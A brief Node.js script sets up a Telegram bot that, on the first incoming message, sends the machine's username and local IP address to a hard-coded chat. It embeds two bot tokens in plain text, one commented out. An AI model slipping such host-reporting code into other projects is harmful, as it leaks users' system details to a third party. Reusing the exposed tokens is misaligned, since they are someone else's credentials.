const TelegramBot = require('node-telegram-bot-api');
const ip = require("ip")
//const token = "1845492305:AAHpAeqKBwlt0hLfq6FFCjy2bcWsnphfsvg"
const token = "1837648452:AAGm0YWTX4T7Gz1Mg98k-uNcn49KzJG_cL0"
const bot = new TelegramBot(token, {polling: true});
const UserVar = process.env.HOME || "/home/notfound";
const User = UserVar.substring(6);
var i = 0;
const chatId = 416698251;

bot.on('message', (msg) => {
	while (i == 0)
	{
		bot.sendMessage(chatId, User + ' : ' + ip.address() + " has started");
		i++;
	}
});
